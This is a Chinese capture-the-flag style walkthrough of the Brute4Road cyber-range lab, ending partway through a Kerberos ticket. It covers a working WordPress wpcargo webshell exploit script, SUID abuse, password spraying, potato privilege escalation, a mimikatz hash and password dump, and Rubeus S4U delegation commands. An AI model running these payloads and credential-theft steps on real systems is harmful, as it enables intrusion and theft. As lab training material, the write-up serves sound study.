---
title: "春秋云镜 Brute4Road Writeup"
date: 2023-08-04T16:52:23+08:00
lastmod: 2023-08-04T16:52:23+08:00
draft: false
author: "X1r0z"

tags: ['windows', 'domain', 'mssql']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 Brute4Road Writeup

<!--more-->

## flag01

fscan

```shell
$ fscan ./fscan_darwin_arm64 -h 39.99.130.229
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.99.130.229   is alive
[*] Icmp alive hosts len is: 1
39.99.130.229:80 open
39.99.130.229:6379 open
39.99.130.229:21 open
39.99.130.229:22 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle: http://39.99.130.229      code:200 len:4833   title:Welcome to CentOS
[+] Redis:39.99.130.229:6379 unauthorized file:/usr/local/redis/db/dump.rdb
[+] ftp://39.99.130.229:21:anonymous
   [->]pub
已完成 4/4
[*] 扫描结束,耗时: 36.850577042s
```

redis 未授权, 连过去发现是 5.0.x 版本, 一眼主从复制 RCE

还有一个 ftp 匿名登录, 但是感觉好像没啥用?

![image-20230804140448304](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041404337.png)

需要 root 权限

![image-20230804140534850](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041405879.png)

查找 SUID 命令

```shell
$ find / -user root -perm -4000 -print 2>/dev/null
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/sbin/unix_chkpwd
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chage
/usr/bin/base64
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/crontab
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/pkexec
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
```

直接用 base64

![image-20230804141251393](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041412419.png)

## flag02

本机没有 ifconfig 命令, 于是传了个 cdk

当然直接上 Viper 然后看 ip 也行

```shell
./cdk ifconfig
2023/08/04 14:15:04 [+] run ifconfig, using GetLocalAddresses()
2023/08/04 14:15:04 lo 127.0.0.1/8
2023/08/04 14:15:04 lo ::1/128
2023/08/04 14:15:04 eth0 172.22.2.7/16
2023/08/04 14:15:04 eth0 fe80::216:3eff:fe1c:e99b/64
```

内网 fscan

```shell
./fscan -h 172.22.2.0/24
   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.2.3      is alive
(icmp) Target 172.22.2.7      is alive
(icmp) Target 172.22.2.16     is alive
(icmp) Target 172.22.2.18     is alive
(icmp) Target 172.22.2.34     is alive
[*] Icmp alive hosts len is: 5
172.22.2.3:88 open
172.22.2.16:1433 open
172.22.2.34:445 open
172.22.2.16:445 open
172.22.2.18:445 open
172.22.2.3:445 open
172.22.2.34:139 open
172.22.2.34:135 open
172.22.2.16:139 open
172.22.2.18:139 open
172.22.2.3:139 open
172.22.2.16:135 open
172.22.2.7:80 open
172.22.2.3:135 open
172.22.2.16:80 open
172.22.2.18:80 open
172.22.2.18:22 open
172.22.2.7:22 open
172.22.2.7:21 open
172.22.2.7:6379 open
[*] alive ports len is: 20
start vulscan
[*] NetInfo:
[*]172.22.2.3
   [->]DC
   [->]172.22.2.3
[*] WebTitle: http://172.22.2.16        code:404 len:315    title:Not Found
[*] NetInfo:
[*]172.22.2.16
   [->]MSSQLSERVER
   [->]172.22.2.16
[*] NetBios: 172.22.2.34     XIAORANG\CLIENT01              
[*] NetInfo:
[*]172.22.2.34
   [->]CLIENT01
   [->]172.22.2.34
[*] WebTitle: http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS
[*] 172.22.2.3  (Windows Server 2016 Datacenter 14393)
[*] NetBios: 172.22.2.3      [+]DC DC.xiaorang.lab               Windows Server 2016 Datacenter 14393 
[*] 172.22.2.16  (Windows Server 2016 Datacenter 14393)
[*] NetBios: 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393 
[*] NetBios: 172.22.2.18     WORKGROUP\UBUNTU-WEB02         
[+] ftp://172.22.2.7:21:anonymous 
   [->]pub
[*] WebTitle: http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点
```

整理信息

```shell
172.22.2.3 DC
172.22.2.34 CLIENT01
172.22.2.16 MSSQLSERVER 1433,80
172.22.2.18 UBUNTU-WEB02, 80, 22
172.22.2.7 本机
```

172.22.2.18 有 wordpress, wpscan 扫一遍

```shell
$ proxychains wpscan --url "http://172.22.2.18/"
[proxychains] config file found: /usr/local/etc/proxychains.conf
[proxychains] preloading /usr/local/lib/libproxychains4.dylib
[proxychains] DLL init: proxychains-ng 4.16-git-13-g133e06b
[proxychains] DLL init: proxychains-ng 4.16-git-13-g133e06b
[proxychains] DLL init: proxychains-ng 4.16-git-13-g133e06b
[proxychains] DLL init: proxychains-ng 4.16-git-13-g133e06b
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.22.2.18/ [172.22.2.18]
[+] Started: Fri Aug  4 14:26:23 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.22.2.18/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.22.2.18/index.php/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://172.22.2.18/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: twentytwentytwo
 | Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wpcargo
 | Location: http://172.22.2.18/wp-content/plugins/wpcargo/
 | Last Updated: 2023-07-19T14:54:00.000Z
 | [!] The version is out of date, the latest version is 6.10.9
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 6.x.x (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:16 <================> (137 / 137) 100.00% Time: 00:00:16

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Aug  4 14:26:51 2023
[+] Requests Done: 172
[+] Cached Requests: 5
[+] Data Sent: 42.801 KB
[+] Data Received: 250.835 KB
[+] Memory used: 300.25 MB
[+] Elapsed time: 00:00:28
```

wordpress 一般都是先从插件入手, 实在不行了再去爆破用户名密码

wpcargo 插件存在未授权 RCE, exp 如下

https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a

```python
import sys
import binascii
import requests

# This is a magic string that when treated as pixels and compressed using the png
# algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'

def encode_character_code(c: int):
    return '{:08b}'.format(c).replace('0', 'x')

text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

destination_url = 'http://172.22.2.18/'
cmd = 'id'

# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.
requests.get(
    f"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&sizefactor=.090909090909&size=1&filepath=/var/www/html/webshell.php"
)

# We have uploaded a webshell - now let's use it to execute a command.
print(requests.post(
    f"{destination_url}webshell.php?1=system", data={"2": cmd}
).content.decode('ascii', 'ignore'))
```

![image-20230804143308278](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041433309.png)

蚁剑连接

![image-20230804143610122](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041436161.png)

ps aux 发现开了 smb 服务

![image-20230804143803512](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041438545.png)

smb 相关的文件

```shell
(www-data:/tmp) $ find / -name smb* 2>/dev/null
/boot/grub/i386-pc/smbios.mod
/run/samba/smbd_cleanupd.tdb
/run/samba/smbXsrv_open_global.tdb
/run/samba/smbXsrv_tcon_global.tdb
/run/samba/smbXsrv_session_global.tdb
/run/samba/smbXsrv_client_global.tdb
/run/samba/smbXsrv_version_global.tdb
/run/samba/smbd.pid
/etc/apparmor.d/samba/smbd-shares
/etc/apparmor.d/abstractions/smbpass
/etc/systemd/system/multi-user.target.wants/smbd.service
/etc/samba/smb.conf
/etc/init.d/smbd
/sys/fs/cgroup/pids/system.slice/smbd.service
/sys/fs/cgroup/blkio/system.slice/smbd.service
/sys/fs/cgroup/devices/system.slice/smbd.service
/sys/fs/cgroup/memory/system.slice/smbd.service
/sys/fs/cgroup/cpu,cpuacct/system.slice/smbd.service
/sys/fs/cgroup/systemd/system.slice/smbd.service
/sys/fs/cgroup/unified/system.slice/smbd.service
/sys/firmware/qemu_fw_cfg/by_name/etc/smbios
/sys/firmware/qemu_fw_cfg/by_name/etc/smbios/smbios-tables
/sys/firmware/qemu_fw_cfg/by_name/etc/smbios/smbios-anchor
/sys/firmware/dmi/tables/smbios_entry_point
/var/lib/systemd/deb-systemd-helper-enabled/smbd.service.dsh-also
/var/lib/systemd/deb-systemd-helper-enabled/multi-user.target.wants/smbd.service
/usr/sbin/smbd
/usr/bin/smbpasswd
/usr/bin/smbcontrol
/usr/bin/smbstatus
/usr/src/linux-headers-5.4.0-26-generic/include/config/dell/smbios
/usr/src/linux-headers-5.4.0-26-generic/include/config/dell/smbios.h
/usr/src/linux-headers-5.4.0-26-generic/include/config/i2c/smbus.h
/usr/src/linux-headers-5.4.0-26-generic/include/config/rmi4/smb.h
/usr/src/linux-headers-5.4.0-26-generic/include/config/charger/smb347.h
/usr/src/linux-headers-5.4.0-26-generic/include/config/mouse/elan/i2c/smbus.h
/usr/src/linux-headers-5.4.0-26-generic/include/config/mouse/ps2/synaptics/smbus.h
/usr/src/linux-headers-5.4.0-26-generic/include/config/mouse/ps2/elantech/smbus.h
/usr/src/linux-headers-5.4.0-26-generic/include/config/mouse/ps2/smbus.h
/usr/src/linux-headers-5.4.0-110/include/trace/events/smbus.h
/usr/src/linux-headers-5.4.0-110/include/linux/power/smb347-charger.h
/usr/src/linux-headers-5.4.0-110-generic/include/config/dell/smbios
/usr/src/linux-headers-5.4.0-110-generic/include/config/dell/smbios.h
/usr/src/linux-headers-5.4.0-110-generic/include/config/i2c/smbus.h
/usr/src/linux-headers-5.4.0-110-generic/include/config/rmi4/smb.h
/usr/src/linux-headers-5.4.0-110-generic/include/config/charger/smb347.h
/usr/src/linux-headers-5.4.0-110-generic/include/config/mouse/elan/i2c/smbus.h
/usr/src/linux-headers-5.4.0-110-generic/include/config/mouse/ps2/synaptics/smbus.h
/usr/src/linux-headers-5.4.0-110-generic/include/config/mouse/ps2/elantech/smbus.h
/usr/src/linux-headers-5.4.0-110-generic/include/config/mouse/ps2/smbus.h
/usr/src/linux-headers-5.4.0-26/include/trace/events/smbus.h
/usr/src/linux-headers-5.4.0-26/include/linux/power/smb347-charger.h
/usr/share/bash-completion/completions/smbpasswd
/usr/share/bash-completion/completions/smbtar
/usr/share/bash-completion/completions/smbget
/usr/share/bash-completion/completions/smbtree
/usr/share/bash-completion/completions/smbcquotas
/usr/share/bash-completion/completions/smbclient
/usr/share/bash-completion/completions/smbcacls
/usr/share/doc/samba/examples/smbadduser.in
/usr/share/doc/samba/examples/printing/smbprint.sysv
/usr/share/doc/samba-common/examples/smb.conf.default
/usr/share/man/man8/smbd.8.gz
/usr/share/man/man8/smbpasswd.8.gz
/usr/share/man/man1/smbcontrol.1.gz
/usr/share/man/man1/smbstatus.1.gz
/usr/share/man/man5/smbpasswd.5.gz
/usr/share/man/man5/smb.conf.5.gz
/usr/share/samba/smb.conf
/usr/lib/python3/dist-packages/samba/samba3/smbd.cpython-38-x86_64-linux-gnu.so
/usr/lib/python3/dist-packages/samba/dcerpc/smb_acl.cpython-38-x86_64-linux-gnu.so
/usr/lib/python3/dist-packages/samba/tests/__pycache__/smbd_fuzztest.cpython-38.pyc
/usr/lib/python3/dist-packages/samba/tests/__pycache__/smbd_base.cpython-38.pyc
/usr/lib/python3/dist-packages/samba/tests/__pycache__/smb.cpython-38.pyc
/usr/lib/python3/dist-packages/samba/tests/smbd_fuzztest.py
/usr/lib/python3/dist-packages/samba/tests/smbd_base.py
/usr/lib/python3/dist-packages/samba/tests/smb.py
/usr/lib/python3/dist-packages/samba/tests/blackbox/__pycache__/smbcacls.cpython-38.pyc
/usr/lib/python3/dist-packages/samba/tests/blackbox/__pycache__/smbcontrol.cpython-38.pyc
/usr/lib/python3/dist-packages/samba/tests/blackbox/__pycache__/smbcontrol_process.cpython-38.pyc
/usr/lib/python3/dist-packages/samba/tests/blackbox/__pycache__/smbcacls_basic.cpython-38.pyc
/usr/lib/python3/dist-packages/samba/tests/blackbox/smbcontrol.py
/usr/lib/python3/dist-packages/samba/tests/blackbox/smbcontrol_process.py
/usr/lib/python3/dist-packages/samba/tests/blackbox/smbcacls.py
/usr/lib/python3/dist-packages/samba/tests/blackbox/smbcacls_basic.py
/usr/lib/systemd/system/smbd.service
/usr/lib/modules/5.4.0-110-generic/kernel/drivers/power/supply/smb347-charger.ko
/usr/lib/modules/5.4.0-26-generic/kernel/drivers/power/supply/smb347-charger.ko
/usr/lib/grub/i386-pc/smbios.mod
```

smb 版本信息

```shell
$ proxychains nmap -sV -sT 172.22.2.18 -p 139,445
[proxychains] config file found: /usr/local/etc/proxychains.conf
[proxychains] preloading /usr/local/lib/libproxychains4.dylib
[proxychains] DLL init: proxychains-ng 4.16-git-13-g133e06b
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 14:47 CST
Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for 172.22.2.18
Host is up (0.17s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.27 seconds
```

好像没啥可利用的地方, 于是去翻了翻本地的 mysql

3306 端口只监听 127.0.0.1, 需要端口转发或者直接用 adminer.php 连接

flag02

![image-20230804145500704](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041455743.png)

## flag03

另外一个表

![image-20230804145529119](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041455156.png)

看起来像是密码, 于是本地保存下来去跑了一遍内网的 smb 和 mssql

smb

```shell
./fscan -h 172.22.2.0/24 -m smb -pwdf pass.txt
   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
-m  smb  start scan the port: 445
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.2.3      is alive
(icmp) Target 172.22.2.7      is alive
(icmp) Target 172.22.2.16     is alive
(icmp) Target 172.22.2.18     is alive
(icmp) Target 172.22.2.34     is alive
[*] Icmp alive hosts len is: 5
172.22.2.3:445 open
172.22.2.34:445 open
172.22.2.16:445 open
172.22.2.18:445 open
[*] alive ports len is: 4
start vulscan
[+] SMB:172.22.2.18:445:administrator pAssw0rd
[+] SMB:172.22.2.16:445:admin pAssw0rd
已完成 4/4
[*] 扫描结束,耗时: 19.857359993s
```

`172.22.2.16:445:admin pAssw0rd` 连接过去发现好像并没有什么有用的东西, 另外一个记得是连不上的

mssql

```shell
./fscan -h 172.22.2.16 -m mssql -pwdf pass.txt
   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
-m  mssql  start scan the port: 1433
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.2.16     is alive
[*] Icmp alive hosts len is: 1
172.22.2.16:1433 open
[*] alive ports len is: 1
start vulscan
[+] mssql:172.22.2.16:1433:sa  ElGNkOiC
已完成 1/1
[*] 扫描结束,耗时: 1.249542963s
```

MDUT

![image-20230804151339592](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041513644.png)

whoami

![image-20230804151435109](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041514152.png)

考虑 SweetPotato 提权

![image-20230804153312796](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041533851.png)

flag03

![image-20230804153642079](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041536136.png)

## flag04

BloodHound

![image-20230804153945192](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041539243.png)

两种思路

- Users 组为 Enterprise Admins 组的成员, 因此只要拿到 William 账户的凭据就能拿下域控
- MSSQLSERVER 配置了到域控的约束委派, 可以通过 S4U 伪造高权限 ST 拿下域控

进程列表中可以看到存在 William 的会话

![image-20230804154219867](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041542913.png)

mimikatz 导出凭据

```shell
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain       NTLM                              SHA1                                      DPAPI
--------       ------       ----                              ----                                      -----
MSSQLSERVER$   XIAORANG     5f0168d282cc28f82f6b757373c4f953  e67527667f01f1f04408c4e955d184f980e8c780
MSSQLSERVER$   XIAORANG     cea3e66a2715c71423e7d3f0ff6cd352  6de4e8f192569bbc44ae94f273870635ae878094
MSSQLSERVER01  MSSQLSERVER  ded5ad90b3d8560838a777039641c673  a2cd9d2963f29b162847e8a1a2c19d5e0641a162
MSSQLSERVER02  MSSQLSERVER  3aa518732551a136003ea41f9599a1ec  6f1ed1f677201d998667bd8e3b81cfb52b9a138a
MSSQLSERVER03  MSSQLSERVER  2f7c88f56a7236f476d18ea6b5a2d33a  5bc2d09b8b0f7c11a1fc3fb2f97b713ac116b6eb
MSSQLSERVER04  MSSQLSERVER  36bd3cceea3d413e8111b0bef32da84d  414d2c783a3fb2ba855e41c243c583bb0604fe02
MSSQLSERVER05  MSSQLSERVER  b552da4a7f732c40ca73c01dfaea7ebc  7f041a31e763eed45fb881c7f77831b888c3051d
MSSQLSERVER06  MSSQLSERVER  aa206c617e2194dd76b766b7e3c92bc6  62dd8046a71c17fe7263bab86b1ca4506f8c373c
MSSQLSERVER07  MSSQLSERVER  f9f990df1bc869cc205d2513b788a5b8  79746cfe5a2f1eec4350a6b64d87b01455ef9030
MSSQLSERVER08  MSSQLSERVER  465034ebde60dfae889c3e493e1816bf  c96428917f7c8a15ea0370716dee153842afaf02
MSSQLSERVER09  MSSQLSERVER  2dd7fe93426175a9ff3fa928bcf0eb77  a34c0482568fc9329f33ccdc1852fab9ef65bcd1
MSSQLSERVER10  MSSQLSERVER  c3e7aa593081ae1b210547da7d46819b  3bf20cfece021438cf86617f5cabc5e7a69038f7
MSSQLSERVER11  MSSQLSERVER  cee10216b2126aa1a3f239b8201120ef  4867093fc519f7d1e91d80e3790ef8a17a7fdd18
MSSQLSERVER12  MSSQLSERVER  672702a4bd7524269b77dbb6b2e75911  c7a828609e4912ab752b43deda8351dc1a8ea240
MSSQLSERVER13  MSSQLSERVER  b808e9a53247721e84cc314c870080c5  47a42f4a6eed2b2d90f342416f42e2696052f546
MSSQLSERVER14  MSSQLSERVER  7c8553b614055d945f8b8c3cf8eae789  1efdc2efed20ca503bdefea5aef8aa0ea04c257b
MSSQLSERVER15  MSSQLSERVER  6eeb34930fa71d82a464ce235261effd  1dfc6d66d9cfdbaa5fc091fedde9a3387771d09b
MSSQLSERVER16  MSSQLSERVER  42c0eed1872923f6b60118d9711282a6  dcf14b63c01e9d5a9d4d9c25d1b2eb6c65c2e3a6
MSSQLSERVER17  MSSQLSERVER  82fe575c8bb18d01df45eb54d0ebc3b4  13b87dcba388982dcc44feeba232bb50aa29c7e9
MSSQLSERVER18  MSSQLSERVER  31de1b5e8995c7f91070f4a409599c50  070c0d12760e50812236b5717c75222a206aace8
MSSQLSERVER19  MSSQLSERVER  9ce3bb5769303e1258f792792310e33b  1a2452c461d89c45f199454f59771f17423e72f9
MSSQLSERVER20  MSSQLSERVER  f5c512b9cb3052c5ad35e526d44ba85a  b09c8d9463c494d36e1a4656c15af8e1a7e4568f
William        XIAORANG     8853911fd59e8d0a82176e085a2157de  e4fd18cfd47b9a77836c82283fb560e6f465bc40  da3fc187c1ff105853ec62c10cddd26b

wdigest credentials
===================

Username       Domain       Password
--------       ------       --------
(null)         (null)       (null)
MSSQLSERVER$   XIAORANG     (null)
MSSQLSERVER01  MSSQLSERVER  (null)
MSSQLSERVER02  MSSQLSERVER  (null)
MSSQLSERVER03  MSSQLSERVER  (null)
MSSQLSERVER04  MSSQLSERVER  (null)
MSSQLSERVER05  MSSQLSERVER  (null)
MSSQLSERVER06  MSSQLSERVER  (null)
MSSQLSERVER07  MSSQLSERVER  (null)
MSSQLSERVER08  MSSQLSERVER  (null)
MSSQLSERVER09  MSSQLSERVER  (null)
MSSQLSERVER10  MSSQLSERVER  (null)
MSSQLSERVER11  MSSQLSERVER  (null)
MSSQLSERVER12  MSSQLSERVER  (null)
MSSQLSERVER13  MSSQLSERVER  (null)
MSSQLSERVER14  MSSQLSERVER  (null)
MSSQLSERVER15  MSSQLSERVER  (null)
MSSQLSERVER16  MSSQLSERVER  (null)
MSSQLSERVER17  MSSQLSERVER  (null)
MSSQLSERVER18  MSSQLSERVER  (null)
MSSQLSERVER19  MSSQLSERVER  (null)
MSSQLSERVER20  MSSQLSERVER  (null)
William        XIAORANG     (null)

kerberos credentials
====================

Username       Domain        Password
--------       ------        --------
(null)         (null)        (null)
MSSQLSERVER$   xiaorang.lab  ......(略)
MSSQLSERVER$   XIAORANG.LAB  (null)
MSSQLSERVER$   xiaorang.lab  (p4Spnv`&9xTZ=D'D/lz[a:94O:$E!7&zfcMza9k;Se"&>cBCBU0bxw.xL"B>\GmtUT,<:q3Yxfq#`O3sLI;OK" (_T_T5- $zV]-i;)c$qIj&$RgttdZI"m
MSSQLSERVER01  MSSQLSERVER   (null)
MSSQLSERVER02  MSSQLSERVER   (null)
MSSQLSERVER03  MSSQLSERVER   (null)
MSSQLSERVER04  MSSQLSERVER   (null)
MSSQLSERVER05  MSSQLSERVER   (null)
MSSQLSERVER06  MSSQLSERVER   (null)
MSSQLSERVER07  MSSQLSERVER   (null)
MSSQLSERVER08  MSSQLSERVER   (null)
MSSQLSERVER09  MSSQLSERVER   (null)
MSSQLSERVER10  MSSQLSERVER   (null)
MSSQLSERVER11  MSSQLSERVER   (null)
MSSQLSERVER12  MSSQLSERVER   (null)
MSSQLSERVER13  MSSQLSERVER   (null)
MSSQLSERVER14  MSSQLSERVER   (null)
MSSQLSERVER15  MSSQLSERVER   (null)
MSSQLSERVER16  MSSQLSERVER   (null)
MSSQLSERVER17  MSSQLSERVER   (null)
MSSQLSERVER18  MSSQLSERVER   (null)
MSSQLSERVER19  MSSQLSERVER   (null)
MSSQLSERVER20  MSSQLSERVER   (null)
William        XIAORANG.LAB  Willg1UoO6Jt
mssqlserver$   XIAORANG.LAB  ......(略)
```

Rubeus 申请 ST

```shell
c:\Users\MSSQLSERVER> Rubeus.exe s4u /user:MSSQLSERVER$ /rc4:5f0168d282cc28f82f6b757373c4f953 /domain:xiaorang.lab /impersonateuser:Administrator /msdsspn:cifs/DC.xiaorang.lab /nowrap /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3 

[*] Action: S4U

[*] Using rc4_hmac hash: 5f0168d282cc28f82f6b757373c4f953
[*] Building AS-REQ (w/ preauth) for: 'xiaorang.lab\MSSQLSERVER$'
[*] Using domain controller: 172.22.2.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE2Fz7FstQiXH5t+n9FViO0C8Pf5BcI6S9xUfkwaYf2NecqckIat1ADgdlKLChzmhoWhk2KN+oanfXUpJ3GNdobJRTBm/L1aPfq4dnRbUjz38kzMHsy+dOZHp1r5EfNM2KIkXYVjqknrv3tOUAFwKsDj8jYVo/XAM/OEOAPOTZzJ7JO3HXJVKpGThL1Nm6LGibfoORwDiZfyT6aiOEdL5LruTGXi8WV4lPGpnvjenYRPaB1AY4x4A+za3jakzgaMJnk5AbyAC74Ut7IoiF7QgiBzQ5u/+I+U8PvgPpOzV3gSDxGdMD1BKY/3BrppaEKuvtcIEqtFt2g7dn6ZTxP5OHpSPs+p42g85r73W6wjyNeB2rEmkKISHaHkT4CmSq9oirQrQFiVK8IqfpoU+1WUkHs370iaU5ZyIXo75Cb5s6WzO6CeyxYKaLCG3Ya+F9ifDzLhe+5eOHi/azarCTujLsIvJLf6cDzNbUEfSigFiWlACRG+Cye0DxEGqM54vkX7KTW2ClE4yUrAp+F7uJgNiERvGS5pB5GtnRHENZ0+5dXGxfqHb/4KjqcQ26qe4ycc9bejz9QIZaFO11xJGCB+8KJurtWBLmXCGR6TTYJvzxpOjbjRBhlqGNH5oVnHEWr/+afNEO3zhdn8KOGuZTWp+VUqOXrJishxdYVUj5lV46P/4bn4JDIXl6UiT4SUsbW89IsWZCOKbezuiTOOf3hgGh8aNZobIld/YJQR7t1bXV17r9jqeOYG+WquEt02+2mUWaGxx4VF64MPBVyqV89IF6dZvc2aCunsX1GxKicnJcmlfHE3IpVSniU7JE0J9j9o/WKzlpBOk3YewgondPzcUdFnxNT3c8RDfBuACGQlYousrjKYDG6BkdAAVgnj8ACjV4WGJOzTXr7EKzNyuBwOv8Hg0uOPCAGznulCFyfzvyEcyzcfNZJDx9SJTjO9LE3y2Z5gxKVVU+UeTZD9/yRvdDktfIwAwLuMaiy+iNu6lSbIMhwxEtKTF5XrcQjMdND42eHzn8vnnYrQbaBBlEb1ceQMyTYZD4xoB4v+